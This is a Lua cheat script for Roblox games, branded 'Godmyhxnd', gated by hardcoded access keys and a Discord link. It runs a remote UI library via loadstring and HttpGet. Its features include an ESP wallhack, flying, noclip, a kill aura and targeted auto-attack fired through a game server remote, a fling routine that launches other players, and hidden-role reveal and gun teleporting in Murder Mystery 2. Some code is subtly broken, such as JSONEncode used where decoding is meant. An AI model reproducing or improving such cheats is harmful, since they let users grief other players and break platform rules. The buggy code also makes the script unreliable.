if not game:IsLoaded() then
    game.Loaded:Wait() 
end

local targetParent = (gethui and gethui()) or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

if getgenv().IsScriptRunning then
    pcall(function()
        local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
        WindUI:Notify({
            Title = "Warning!",
            Content = "สคริปต์กำลังทำงานอยู่แล้ว ไม่จำเป็นต้องรันซ้ำ!",
            Type = "Warning"
        })
    end)
    return
end
getgenv().IsScriptRunning = true

-- [[ Services & Variables ]] --
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local camera = workspace.CurrentCamera
local lp = game.Players.LocalPlayer

local AttackRemote = rs:WaitForChild("AttackHandlerRemoteEvent", 5) 


local Window = WindUI:CreateWindow({
    Title = "Godmyhxnd",
    Author = "by homebuu",
    Icon = "palette",
    Parent = targetParent,
    Folder = "HomebuuConfigs",
    NewElements = true,
    Theme = "Emerald",
    Size = UDim2.fromOffset(550, 450),
    Acrylic = false,
    HideSearchBar = true,
    SideBarWidth = 180,
    ThemeSwitch = false,
    OpenButton = {
        Title = "Godmyhxnd",
        CornerRadius = UDim.new(1, 0), 
        StrokeThickness = 3,
        Enabled = true, 
        Draggable = true, 
        OnlyMobile = true, 
        Color = ColorSequence.new(Color3.fromHex("#8A2BE2"), Color3.fromHex("#4B0082")),
    },
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function() end,
    },
    KeySystem = { 
        Key = { "HomebuuKuy56", "HomebuuKuy54", "Home56", "Godmyhxnd", "GodNo1", "Godtheyear" },
        Note = "กรุณานำคีย์ที่ได้จากทางเรา มาใส่เพื่อรันสคริปต์. -> (https://discord.gg/AZ9tvMCmY7)",
        URL = "https://www.youtube.com/watch?v=TbjWsRQ6Hwk",
        SaveKey = false,
    },
})

Window:SetToggleKey(Enum.KeyCode.LeftControl)
Window:Tag({
    Title = "v1.0.5",
    Color = Color3.fromHex("#30ff6a"),
    Radius = 10, 
})
Window:SetBackgroundTransparency(0.1)

-- [[ Variables Control ]] --
local playerSettings = {
    WalkSpeed = 16,
    JumpPower = 50,
    LockPosition = false,
    FreezeCFrame = nil,
    Flying = false,
    FlySpeed = 50,
    PassThrough = false,
    AntiRagdoll = false,
    AntiFling = false,
    Spinning = false,
    SpinSpeed = 180,
}

local DINOSAUR_PLACE_IDS = {
    [75541741887441] = true, 
}
local MM2_PLACE_IDS = {
    [142823291] = true, 
}
local VIP_USER_IDS = {
    [3967139631] = true,
}
local BROOK_PLACE_IDS = {
    [4924922222] = true, 
}
local isDinosaurGame = DINOSAUR_PLACE_IDS[game.PlaceId] or false
local ismm2Game = MM2_PLACE_IDS[game.PlaceId] or false
local isbrookharen = BROOK_PLACE_IDS[game.PlaceId] or false
local isvips = VIP_USER_IDS[player.UserId] or false

-- [[ ESP Variables ]] --
local espSettings = { Names = false, Boxes = false, Lines = false, Color = Color3.fromRGB(255, 255, 255) }
local espCache = {}

local killSettings = {
    AutoAttack = false,
    KillAura = false,
    TargetPlayerToggle = false,
    AuraRange = 20,
    SelectedPlayer = nil,
    AttackCooldown = 0.1,
    DisableSwim = false
}

local teleportTarget = nil
local lastAttackTime = 0
local bodyVelocity, bodyGyro
local spinAngularVelocity, spinAttachment

local keyMap = {
    ["LeftControl"] = Enum.KeyCode.LeftControl,
    ["RightControl"] = Enum.KeyCode.RightControl,
    ["LeftShift"] = Enum.KeyCode.LeftShift,
    ["RightShift"] = Enum.KeyCode.RightShift,
    ["LeftAlt"] = Enum.KeyCode.LeftAlt,
    ["RightAlt"] = Enum.KeyCode.RightAlt,
    ["F1"] = Enum.KeyCode.F1,
    ["F2"] = Enum.KeyCode.F2,
    ["F3"] = Enum.KeyCode.F3,
    ["F4"] = Enum.KeyCode.F4,
    ["F5"] = Enum.KeyCode.F5,
    ["F6"] = Enum.KeyCode.F6,
    ["Insert"] = Enum.KeyCode.Insert,
    ["Delete"] = Enum.KeyCode.Delete
}

local currentTheme = "Violet"
local configFileName = "HomebuuConfigs/DinoConfig.json"

local function getPlayerNames()
    local names = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            table.insert(names, p.Name)
        end
    end
    return names
end

local function saveConfiguration()
    if not isfolder("HomebuuConfigs") then
        makefolder("HomebuuConfigs")
    end
    
    local dataToSave = {
        playerSettings = {
            WalkSpeed = playerSettings.WalkSpeed,
            JumpPower = playerSettings.JumpPower,
            FlySpeed = playerSettings.FlySpeed,
            PassThrough = playerSettings.PassThrough,
            AntiRagdoll = playerSettings.AntiRagdoll
        },
        espSettings = {
            Names = espSettings.Names,
            Boxes = espSettings.Boxes,
            Lines = espSettings.Lines,
            Color = { espSettings.Color.R, espSettings.Color.G, espSettings.Color.B }
        },
        killSettings = {
            AutoAttack = killSettings.AutoAttack,
            KillAura = killSettings.KillAura,
            AuraRange = killSettings.AuraRange,
            TargetPlayerToggle = killSettings.TargetPlayerToggle
        },
        Theme = currentTheme
    }

    local success, err = pcall(function()
        writefile(configFileName, HttpService:JSONEncode(dataToSave))
    end)

    if success then
        WindUI:Notify({
            Title = "Config Saved!",
            Content = "บันทึกการตั้งค่าทั้งหมดเรียบร้อยแล้ว",
            Type = "Success"
        })
    else
        WindUI:Notify({
            Title = "Save Failed!",
            Content = "เกิดข้อผิดพลาดในการบันทึกค่า: " .. tostring(err),
            Type = "Error"
        })
    end
end

local function loadConfiguration()
    if not isfile(configFileName) then
        WindUI:Notify({
            Title = "Not Found!",
            Content = "ไม่พบไฟล์บันทึกการตั้งค่า",
            Type = "Warning"
        })
        return
    end

    local success, result = pcall(function()
        return HttpService:JSONEncode(readfile(configFileName))
    end)

    if success and result then
        if result.playerSettings then
            playerSettings.WalkSpeed = result.playerSettings.WalkSpeed or 16
            playerSettings.JumpPower = result.playerSettings.JumpPower or 50
            playerSettings.FlySpeed = result.playerSettings.FlySpeed or 50
            playerSettings.PassThrough = result.playerSettings.PassThrough or false
            playerSettings.AntiRagdoll = result.playerSettings.AntiRagdoll or false
        end
        if result.espSettings then
            espSettings.Names = result.espSettings.Names or false
            espSettings.Boxes = result.espSettings.Boxes or false
            espSettings.Lines = result.espSettings.Lines or false
            if result.espSettings.Color then
                espSettings.Color = Color3.new(result.espSettings.Color[1], result.espSettings.Color[2], result.espSettings.Color[3])
            end
        end
        if result.killSettings then
            killSettings.AutoAttack = result.killSettings.AutoAttack or false
            killSettings.KillAura = result.killSettings.KillAura or false
            killSettings.AuraRange = result.killSettings.AuraRange or 20
            killSettings.TargetPlayerToggle = result.killSettings.TargetPlayerToggle or false
        end
        if result.Theme then
            currentTheme = result.Theme
            WindUI:SetTheme(currentTheme)
        end

        WindUI:Notify({
            Title = "Config Loaded!",
            Content = "โหลดการตั้งค่าเรียบร้อยแล้ว",
            Type = "Success"
        })
    end
end

-- [[ Spin Bot Helper ]] --
local function updateSpin()
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    
    if playerSettings.Spinning and hrp then
        if not spinAttachment or spinAttachment.Parent ~= hrp then
            if spinAttachment then spinAttachment:Destroy() end
            spinAttachment = Instance.new("Attachment")
            spinAttachment.Name = "SpinAttachment"
            spinAttachment.Parent = hrp
        end

        if not spinAngularVelocity or spinAngularVelocity.Parent ~= hrp then
            if spinAngularVelocity then spinAngularVelocity:Destroy() end
            spinAngularVelocity = Instance.new("AngularVelocity")
            spinAngularVelocity.Name = "SpinAngularVelocity"
            spinAngularVelocity.Attachment0 = spinAttachment
            spinAngularVelocity.MaxTorque = math.huge
            spinAngularVelocity.RelativeTo = Enum.ActuatorRelativeTo.World
            spinAngularVelocity.Parent = hrp
        end

        spinAngularVelocity.AngularVelocity = Vector3.new(0, math.rad(playerSettings.SpinSpeed), 0)
    else
        if spinAngularVelocity then spinAngularVelocity:Destroy() spinAngularVelocity = nil end
        if spinAttachment then spinAttachment:Destroy() spinAttachment = nil end
    end
end

-- [[ Humanoid Movement Handler ]] --
local function applyHumanoidStats()
    local char = player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        if hum.WalkSpeed > 16 and playerSettings.WalkSpeed == 16 then
            playerSettings.WalkSpeed = hum.WalkSpeed
        else
            hum.WalkSpeed = playerSettings.WalkSpeed
        end

        if hum.UseJumpPower then
            hum.JumpPower = playerSettings.JumpPower
        else
            hum.JumpHeight = playerSettings.JumpPower * 0.14
        end
    end
end

player.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid")
    if hum.WalkSpeed > 16 and playerSettings.WalkSpeed == 16 then
        playerSettings.WalkSpeed = hum.WalkSpeed
    end
    
    task.wait(0.5)
    applyHumanoidStats()
end)

-- [[ ESP Functions ]] --
local function createESP(v)
    if v == player or espCache[v] then return end
    
    local data = {}
    data.Box = Drawing.new("Square")
    data.Box.Thickness = 1
    data.Box.Filled = false
    
    data.Line = Drawing.new("Line")
    data.Line.Thickness = 1
    
    data.Name = Drawing.new("Text")
    data.Name.Size = 14
    data.Name.Center = true
    data.Name.Outline = true

    espCache[v] = data
end

local function removeESP(v)
    if espCache[v] then
        local data = espCache[v]
        pcall(function()
            data.Box:Remove()
            data.Name:Remove()
            data.Line:Remove()
        end)
        espCache[v] = nil
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    createESP(p)
end

Players.PlayerAdded:Connect(createESP)
Players.PlayerRemoving:Connect(function(leavingPlayer)
    removeESP(leavingPlayer)
    if killSettings.SelectedPlayer == leavingPlayer then
        killSettings.SelectedPlayer = nil
    end
end)

-- [[ Fly System Logic ]] --
local swimConnection = nil
local function startFlying()
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end

    hum:ChangeState(Enum.HumanoidStateType.Freefall)

    if not swimConnection then
        swimConnection = hum.StateChanged:Connect(function(_, newState)
            if playerSettings.Flying and newState == Enum.HumanoidStateType.Swimming then
                hum:ChangeState(Enum.HumanoidStateType.Freefall)
            end
        end)
    end

    if bodyVelocity then bodyVelocity:Destroy() end
    if bodyGyro then bodyGyro:Destroy() end

    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(1e9, 1e9, 1e9)
    bodyVelocity.Velocity = Vector3.zero
    bodyVelocity.Parent = hrp

    bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
    bodyGyro.CFrame = hrp.CFrame
    bodyGyro.Parent = hrp
end

local function stopFlying()
    local char = player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")

    if swimConnection then
        swimConnection:Disconnect()
        swimConnection = nil
    end

    if bodyVelocity then bodyVelocity:Destroy() bodyVelocity = nil end
    if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end

    if hum then
        hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    end
end


-- [[ RunService Loops ]] --
RunService.Stepped:Connect(function()
    local char = player.Character
    if char then
        if playerSettings.PassThrough then
            for _, child in ipairs(char:GetDescendants()) do
                if child:IsA("BasePart") then
                    child.CanCollide = false
                end
            end
        end

        if playerSettings.AntiRagdoll then
            local hum = char:FindFirstChildOfClass("Humanoid")
            local hrp = char:FindFirstChild("HumanoidRootPart")

            if hum then
                local state = hum:GetState()
                if state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.Physics then
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
                
                for _, obj in ipairs(char:GetDescendants()) do
                    if obj:IsA("BallSocketConstraint") or obj:IsA("HingeConstraint") or (obj:IsA("StringValue") and obj.Name:lower():find("ragdoll")) then
                        obj:Destroy()
                    end
                end
            end

            if hrp and hrp.RotVelocity.Magnitude > 30 then
                hrp.RotVelocity = Vector3.zero
            end
        end

        if playerSettings.AntiFling then
            local myHrp = char:FindFirstChild("HumanoidRootPart")
            if myHrp then
                if myHrp.AssemblyAngularVelocity.Magnitude > 10 then
                    myHrp.AssemblyAngularVelocity = Vector3.zero
                end

                local currentVel = myHrp.AssemblyLinearVelocity
                local horizontalSpeed = Vector2.new(currentVel.X, currentVel.Z).Magnitude

                if horizontalSpeed > 60 then
                    myHrp.AssemblyLinearVelocity = Vector3.new(0, currentVel.Y, 0)
                end

                for _, otherPlayer in ipairs(Players:GetPlayers()) do
                    if otherPlayer ~= player and otherPlayer.Character then
                        local otherChar = otherPlayer.Character
                        
                        for _, myPart in ipairs(char:GetChildren()) do
                            if myPart:IsA("BasePart") then
                                for _, otherPart in ipairs(otherChar:GetChildren()) do
                                    if otherPart:IsA("BasePart") then
                                        otherPart.CanCollide = false
                                        
                                        local constraintName = "AntiFling_" .. myPart.Name .. "_" .. otherPart.Name
                                        if not myPart:FindFirstChild(constraintName) then
                                            local noCollision = Instance.new("NoCollisionConstraint")
                                            noCollision.Name = constraintName
                                            noCollision.Part0 = myPart
                                            noCollision.Part1 = otherPart
                                            noCollision.Parent = myPart
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function(deltaTime)
    local myChar = player.Character
    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")

    if myChar and myHum and myHrp then
        if playerSettings.LockPosition then
            if playerSettings.FreezeCFrame then
                myHrp.CFrame = playerSettings.FreezeCFrame
                myHrp.Velocity = Vector3.zero
                myHrp.RotVelocity = Vector3.zero
            end
        end

        if playerSettings.Flying then
            if not bodyVelocity or not bodyGyro then
                startFlying()
            end
            
            local flyVector = Vector3.zero
            local camCF = camera.CFrame
            
            if UIS:IsKeyDown(Enum.KeyCode.W) then flyVector = flyVector + camCF.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) then flyVector = flyVector - camCF.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) then flyVector = flyVector - camCF.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) then flyVector = flyVector + camCF.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.E) or UIS:IsKeyDown(Enum.KeyCode.Space) then flyVector = flyVector + Vector3.new(0, 1, 0) end
            if UIS:IsKeyDown(Enum.KeyCode.Q) or UIS:IsKeyDown(Enum.KeyCode.LeftShift) then flyVector = flyVector - Vector3.new(0, 1, 0) end

            if bodyVelocity then
                bodyVelocity.Velocity = flyVector * playerSettings.FlySpeed
            end
            if bodyGyro then
                bodyGyro.CFrame = camCF
            end
        else
            stopFlying()
        end

        if playerSettings.WalkSpeed > 16 and not playerSettings.Flying then
            local moveDir = myHum.MoveDirection
            if moveDir.Magnitude > 0 then
                myHrp.CFrame = myHrp.CFrame + (moveDir * (playerSettings.WalkSpeed / 16) * 10 * deltaTime)
            else
                local lookVector = camera.CFrame.LookVector
                local forwardDir = Vector3.new(lookVector.X, 0, lookVector.Z).Unit
                myHrp.CFrame = myHrp.CFrame + (forwardDir * (playerSettings.WalkSpeed / 16) * 10 * deltaTime)
            end
        end
    end

    -- [[ ESP Loop ]] --
    for v, drawings in pairs(espCache) do
        local char = v.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChild("Humanoid")
        
        if hrp and hum and hum.Health > 0 then
            local pos, onScreen = camera:WorldToViewportPoint(hrp.Position)
            
            if onScreen then
                local distance = myHrp and (myHrp.Position - hrp.Position).Magnitude or 0
                
                if espSettings.Boxes or espSettings.Names then
                    local head = char:FindFirstChild("Head")
                    local headPos = camera:WorldToViewportPoint((head and head.Position or hrp.Position) + Vector3.new(0, 0.5, 0))
                    local legPos = camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 3, 0))
                    local height = math.abs(headPos.Y - legPos.Y)
                    local width = height * 0.6
                    
                    if espSettings.Boxes then
                        drawings.Box.Visible = true
                        drawings.Box.Size = Vector2.new(width, height)
                        drawings.Box.Position = Vector2.new(headPos.X - width / 2, headPos.Y)
                        drawings.Box.Color = espSettings.Color
                    else drawings.Box.Visible = false end

                    if espSettings.Names then
                        drawings.Name.Visible = true
                        drawings.Name.Position = Vector2.new(headPos.X, headPos.Y - 20)
                        drawings.Name.Text = string.format("%s [%dm]\n\n@%s", v.DisplayName, math.floor(distance), v.Name)
                        drawings.Name.Color = espSettings.Color
                    else drawings.Name.Visible = false end
                else
                    drawings.Box.Visible = false
                    drawings.Name.Visible = false
                end

                if espSettings.Lines then
                    drawings.Line.Visible = true
                    drawings.Line.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
                    drawings.Line.To = Vector2.new(pos.X, pos.Y)
                    drawings.Line.Color = espSettings.Color
                else drawings.Line.Visible = false end
            else
                drawings.Box.Visible = false
                drawings.Name.Visible = false
                drawings.Line.Visible = false
            end
        else
            drawings.Box.Visible = false
            drawings.Name.Visible = false
            drawings.Line.Visible = false
        end
    end

    -- [[ Kill System Loop ]] --
    if isDinosaurGame then
        local currentTime = os.clock()
        if AttackRemote and myHrp and (currentTime - lastAttackTime >= killSettings.AttackCooldown) then
            if killSettings.TargetPlayerToggle and killSettings.SelectedPlayer then
                local targetChar = killSettings.SelectedPlayer.Character
                local targetHrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")

                if targetHrp and targetHum and targetHum.Health > 0 then
                    local dist = (myHrp.Position - targetHrp.Position).Magnitude
                    if dist <= killSettings.AuraRange then
                        AttackRemote:FireServer(targetHum)
                        lastAttackTime = currentTime
                    end
                end
            elseif killSettings.KillAura then
                local closestTarget = nil
                local closestDist = killSettings.AuraRange

                for _, otherPlayer in ipairs(Players:GetPlayers()) do
                    if otherPlayer ~= player and otherPlayer.Character then
                        local targetChar = otherPlayer.Character
                        local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
                        local targetHum = targetChar:FindFirstChildOfClass("Humanoid")

                        if targetHrp and targetHum and targetHum.Health > 0 then
                            local dist = (myHrp.Position - targetHrp.Position).Magnitude
                            if dist <= closestDist then
                                closestDist = dist
                                closestTarget = targetHum
                            end
                        end
                    end
                end

                if closestTarget then
                    AttackRemote:FireServer(closestTarget)
                    lastAttackTime = currentTime
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.1)
        if isDinosaurGame and AttackRemote and killSettings.AutoAttack and not killSettings.KillAura and not killSettings.TargetPlayerToggle then
            local myChar = player.Character
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if myHum and myHum.Health > 0 then
                AttackRemote:FireServer(myHum)
            end
        end
    end
end)

local function SHubFling(TargetPlayer)
    local MyChar = lp.Character
    local MyHum = MyChar and MyChar:FindFirstChildOfClass("Humanoid")
    local MyRoot = MyChar and MyChar:FindFirstChild("HumanoidRootPart")
    
    if not (MyChar and MyHum and MyRoot) then return end
    
    local TCharacter = TargetPlayer.Character
    if not TCharacter then return end
    local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    local TRootPart = THumanoid and THumanoid.RootPart
    local THead = TCharacter:FindFirstChild("Head")
    local Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    local Handle = Accessory and Accessory:FindFirstChild("Handle")
    
    local target = TRootPart or THead or Handle
    if not target then return end

    local OldPos = MyRoot.CFrame
    local Camera = Workspace.CurrentCamera
    local TargetSubject = THead or Handle or THumanoid
    
    repeat 
        Camera.CameraSubject = TargetSubject
        task.wait()
    until Camera.CameraSubject == TargetSubject

    local function FPos(BasePart, Pos, Ang)
        local targetCF = CFrame.new(BasePart.Position) * Pos * Ang
        MyRoot.CFrame = targetCF
        MyRoot.Velocity = Vector3.new(9e7, 9e8, 9e7)
        MyRoot.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
    end

    local BV = Instance.new("BodyVelocity")
    BV.Name = "SeYyyVel!?"
    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    BV.Parent = MyRoot
    
    MyHum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

    local start = tick()
    local angle = 0
    local timeout = 2.5
    
    repeat
        if MyRoot and THumanoid and target then
            angle = angle + 100
            for _, offset in ipairs({CFrame.new(0, 1.5, 0), CFrame.new(0, -1.5, 0), CFrame.new(2.25, 1.5, -2.25), CFrame.new(-2.25, -1.5, 2.25)}) do
                FPos(target, offset + THumanoid.MoveDirection, CFrame.Angles(math.rad(angle), 0, 0))
                task.wait()
            end
        end
    until not target or not target.Parent or target.Velocity.Magnitude > 500 or (tick() - start) > timeout

    BV:Destroy()
    MyHum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    
    repeat 
        Camera.CameraSubject = MyHum
        task.wait()
    until Camera.CameraSubject == MyHum

    repeat
        local cf = OldPos * CFrame.new(0, 0.5, 0)
        MyRoot.CFrame = cf
        MyHum:ChangeState("GettingUp")
        for _, part in ipairs(MyChar:GetChildren()) do
            if part:IsA("BasePart") then
                part.Velocity = Vector3.new(0, 0, 0)
                part.RotVelocity = Vector3.new(0, 0, 0)
            end
        end
        task.wait()
    until (MyRoot.Position - OldPos.Position).Magnitude < 25
end

local function createTab(title, icon)
    if Window.Tab then
        return Window:Tab({ Title = title, Icon = icon })
    elseif Window.AddTab then
        return Window:AddTab({ Title = title, Icon = icon })
    end
end

-- [[ UI Elements ]] --
local MainTab = createTab("Main", "star")
local ProtectionTab = createTab("การป้องกัน", "shield")
local PlayerVisible = createTab("ESP", "eye") 
local TeleportTab = createTab("Teleport", "map-pin")

if isDinosaurGame then
    local killFunction = createTab("Dinosaur Life", "geist:warning") 
    local function checkRemoteWarning()
        if not AttackRemote then
            WindUI:Notify({
                Title = "Warning!",
                Content = "ไม่พบ AttackHandlerRemoteEvent ในแมพนี้ ระบบตีจะไม่ทำงาน",
                Type = "Warning"
            })
        end
    end
    local function updateSwimState(disabled)
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum:SetStateEnabled(Enum.HumanoidStateType.Swimming, not disabled)
            if disabled and hum:GetState() == Enum.HumanoidStateType.Swimming then
                hum:ChangeState(Enum.HumanoidStateType.Freefall)
            end
        end
    end
    killFunction:Toggle({
        Title = "เปิด/ปิด ว่ายน้ำ",
        Default = killSettings.DisableSwim,
        Callback = function(state) 
            updateSwimState(state)
            killSettings.DisableSwim = state
        end
    })

    killFunction:Toggle({
        Title = "เปิด/ปิด Auto Attack",
        Default = killSettings.AutoAttack,
        Callback = function(state) 
            checkRemoteWarning()
            killSettings.AutoAttack = state 
        end
    })

    killFunction:Toggle({
        Title = "เปิด/ปิด Kill Aura",
        Default = killSettings.KillAura,
        Callback = function(state) 
            checkRemoteWarning()
            killSettings.KillAura = state 
        end
    })

    killFunction:Slider({
        Title = "ระยะ Kill Aura (Studs)",
        Step = 1,
        Value = { Min = 5, Max = 50, Default = 20 },
        Callback = function(val) killSettings.AuraRange = val end
    })

    killFunction:Dropdown({
        Title = "เลือกผู้เล่นเป้าหมาย",
        Values = getPlayerNames(),
        Callback = function(selectedName)
            killSettings.SelectedPlayer = Players:FindFirstChild(selectedName)
        end
    })

    killFunction:Toggle({
        Title = "เปิด/ปิด Target Kill",
        Default = killSettings.TargetPlayerToggle,
        Callback = function(state) 
            checkRemoteWarning()
            killSettings.TargetPlayerToggle = state 
        end
    })
end

if ismm2Game then 
    local mm2Function = createTab("Murder Mystery", "geist:warning") 
    local remote = rs:FindFirstChild("Remotes") and rs.Remotes:FindFirstChild("Gameplay") and rs.Remotes.Gameplay:FindFirstChild("PlayerDataChanged")
    local playerData = {}
    local flingTarget
    if remote then
        remote.OnClientEvent:Connect(function(data)
            playerData = data
            if _G.ShowRolesMM2 then
                updateHighlights() 
            end
        end)
    end
    local function getRoles()
        local success, data = pcall(function()
            return rs:FindFirstChild("GetPlayerData", true):InvokeServer()
        end)
        if not success or not data then 
            return {} 
        end

        local roles = {}
        for plr, plrData in pairs(data) do
            if plrData and not plrData.Dead then
                roles[plr] = plrData.Role
            end
        end
        return roles
    end

    local function getMM2Role(v)
        if playerData and playerData[v.Name] then
            local data = playerData[v.Name]
            
            local role = tostring(data.Role)
            
            if role == "Murderer" then
                return {Type = "Murderer", Color = Color3.fromRGB(255, 0, 0)}
            elseif role == "Sheriff" then
                return {Type = "Sheriff", Color = Color3.fromRGB(0, 150, 255)}
            elseif role == "Hero" then
                return {Type = "Hero", Color = Color3.fromRGB(255, 255, 0)}
            end
            -- Innocent ไม่ต้องแสดง
        end

        if v.Backpack:FindFirstChild("Knife") then
            return {Type = "Murderer", Color = Color3.fromRGB(255, 0, 0)}
        end
        if v.Backpack:FindFirstChild("Gun") then
            return {Type = "Sheriff", Color = Color3.fromRGB(0, 150, 255)}
        end

        local char = v.Character
        if char then
            if char:FindFirstChild("Knife") then
                return {Type = "Murderer", Color = Color3.fromRGB(255, 0, 0)}
            end
            if char:FindFirstChild("Gun") then
                return {Type = "Sheriff", Color = Color3.fromRGB(0, 150, 255)}
            end
        end
        return nil
    end
    local function updateHighlights()
        for _, v in pairs(game.Players:GetPlayers()) do
            if v == game.Players.LocalPlayer then continue end
            local char = v.Character
            if char then
                local roleInfo = getMM2Role(v)
                local highlight = char:FindFirstChild("RoleHighlight")
                if _G.ShowRolesMM2 and roleInfo then
                    if not highlight then
                        highlight = Instance.new("Highlight", char)
                        highlight.Name = "RoleHighlight"
                    end
                    highlight.FillColor = roleInfo.Color
                    highlight.FillTransparency = 0.5
                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    highlight.Enabled = true
                else
                    if highlight then highlight:Destroy() end
                end
            end
        end
    end

    local function getMurderer()
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= lp and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                local isMurd = false
                if _G.playerData and _G.playerData[v.Name] then
                    if tostring(_G.playerData[v.Name].Role) == "Murderer" and not _G.playerData[v.Name].Dead then
                        isMurd = true
                    end
                elseif v.Backpack:FindFirstChild("Knife") or v.Character:FindFirstChild("Knife") then
                    isMurd = true
                end
                if isMurd then return v.Character end
            end
        end
        return nil
    end

    local function secureGun()
        local gunDrop = nil
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj.Name == "GunDrop" then
                gunDrop = obj
                break
            end
        end
        if gunDrop then
            local lp = game.Players.LocalPlayer
            local char = lp.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local currentPos = root.CFrame
                if gunDrop:IsA("Model") then
                    root.CFrame = gunDrop:GetPivot() * CFrame.new(0, 1, 0)
                else
                    root.CFrame = gunDrop.CFrame * CFrame.new(0, 1, 0)
                end
                task.wait(0.3) 
                root.CFrame = currentPos
            end
        end
    end

    -- [[ ส่วนของ Toggle ]] --
    mm2Function:Toggle({
        Title = "แสดงบทบาทของผู้เล่น (Chams)",
        Desc = "สแกนทุกคน (แดง=ฆาตกร, ฟ้า=มือปืน)",
        Value = false,
        Callback = function(state)
            _G.ShowRolesMM2 = state
            if not state then
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v.Character and v.Character:FindFirstChild("RoleHighlight") then
                        v.Character.RoleHighlight:Destroy()
                    end
                end
            else
                task.spawn(function()
                    while _G.ShowRolesMM2 do
                        updateHighlights()
                        task.wait(0.1)
                    end
                end)
            end
        end
    })

    local gunDropHighlight = nil
    local gunDropAddedConnection = nil
    local gunDropRemovedConnection = nil
    mm2Function:Toggle({
        Title = "แสดงปืนที่ตกพื้น",
        Desc = "ไฮไลท์ปืนที่ถูกทิ้งไว้บนพื้น",
        Value = false,
        Callback = function(state)
            _G.ShowGunDrop = state

            local function createGunHighlight(obj)
                if gunDropHighlight then
                    gunDropHighlight:Destroy()
                    gunDropHighlight = nil
                end
                gunDropHighlight = Instance.new("Highlight")
                gunDropHighlight.Name = "GunDropHighlight"
                gunDropHighlight.FillColor = Color3.fromRGB(255, 255, 0)
                gunDropHighlight.FillTransparency = 0.3
                gunDropHighlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                gunDropHighlight.OutlineTransparency = 0
                gunDropHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                gunDropHighlight.Adornee = obj
                gunDropHighlight.Parent = game:GetService("CoreGui")
            end

            if not state then
                -- ปิด
                if gunDropAddedConnection then
                    gunDropAddedConnection:Disconnect()
                    gunDropAddedConnection = nil
                end
                if gunDropRemovedConnection then
                    gunDropRemovedConnection:Disconnect()
                    gunDropRemovedConnection = nil
                end
                if gunDropHighlight then
                    gunDropHighlight:Destroy()
                    gunDropHighlight = nil
                end
            else
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj.Name == "GunDrop" then
                        createGunHighlight(obj)
                        break
                    end
                end

                gunDropAddedConnection = workspace.DescendantAdded:Connect(function(obj)
                    if obj.Name == "GunDrop" and _G.ShowGunDrop then
                        createGunHighlight(obj)
                    end
                end)

                gunDropRemovedConnection = workspace.DescendantRemoving:Connect(function(obj)
                    if obj.Name == "GunDrop" and _G.ShowGunDrop then
                        if gunDropHighlight then
                            gunDropHighlight:Destroy()
                            gunDropHighlight = nil
                        end
                    end
                end)
            end
        end
    })

    mm2Function:Toggle({
        Title = "เก็บปืนอัตโนมัติ (Auto Collect Gun)",
        Desc = "วาร์ปไปเก็บปืนที่ตกแล้วกลับมาที่เดิมทันที",
        Value = false,
        Callback = function(state)
            _G.AutoCollectGun = state
